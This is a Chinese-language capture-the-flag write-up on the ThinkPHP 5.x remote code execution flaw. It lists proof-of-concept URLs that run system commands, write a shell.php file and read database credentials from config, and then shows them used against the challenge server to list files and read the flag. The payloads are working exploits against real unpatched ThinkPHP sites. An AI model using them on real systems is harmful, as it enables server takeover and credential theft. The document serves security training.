# php_rce

题目提示 PHP V5 版本，可能暗示存在 RCE 远程代码执行漏洞。

# :)

ThinkPHP V5

十年磨一剑 - 为API开发设计的高性能框架

---

## PHP RCE漏洞

ThinkPHP官方2018年12月9日发布重要的安全更新，修复了一个严重的远程代码执行漏洞。该更新主要涉及一个安全更新，由于框架对控制器名没有进行足够的检测会导致在没有开启强制路由的情况下可能的getshell漏洞，受影响的版本包括5.0和5.1版本，推荐尽快更新到最新版本。影响范围：5.x < 5.1.31, <= 5.0.23。在修复之前程序未对控制器进行过滤，导致攻击者可以通过引入\符号来调用任意类方法。

### POC

 Thinkphp5.0.22

```php
1、http://192.168.1.1/thinkphp/public/?s=.|think\config/get&name=database.username
2、http://192.168.1.1/thinkphp/public/?s=.|think\config/get&name=database.password
3、http://url/to/thinkphp_5.0.22/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id
4、http://url/to/thinkphp_5.0.22/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1
```

  Thinkphp 5

```php
1、http://127.0.0.1/tp5/public/?s=index/\think\View/display&content=%22%3C?%3E%3C?php%20phpinfo();?%3E&data=1
```

  Thinkphp5.1

```php
1、http://url/to/thinkphp5.1.29/?s=index/\think\Request/input&filter=phpinfo&data=1
2、http://url/to/thinkphp5.1.29/?s=index/\think\Request/input&filter=system&data=cmd
3、http://url/to/thinkphp5.1.29/?s=index/\think\template\driver\file/write&cacheFile=shell.php&content=%3C?php%20phpinfo();?%3E
4、http://url/to/thinkphp5.1.29/?s=index/\think\view\driver\Php/display&content=%3C?php%20phpinfo();?%3E
5、http://url/to/thinkphp5.1.29/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1
6、http://url/to/thinkphp5.1.29/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=cmd
7、http://url/to/thinkphp5.1.29/?s=index/\think\Container/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1
8、http://url/to/thinkphp5.1.29/?s=index/\think\Container/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=cmd
```

---

尝试

```php
/?s=index/\think\View/display&content=%22%3C?%3E%3C?php%20phpinfo();?%3E&data=1
```

得到

# 页面错误！请稍后再试～

[ThinkPHP](http://www.thinkphp.cn/) V5.0.20 { 十年磨一剑-为API开发设计的高性能框架 }



继续尝试

```php
/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id
```

得到

```bash
uid=33(www-data) gid=33(www-data) groups=33(www-data) uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

继续尝试

```php
/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=ls
```

得到

```bash
bin boot dev etc flag home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var var
```

找到 flag 继续尝试

```
/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=cat /flag
```

### flag

flag{thinkphp5_rce} flag{thinkphp5_rce}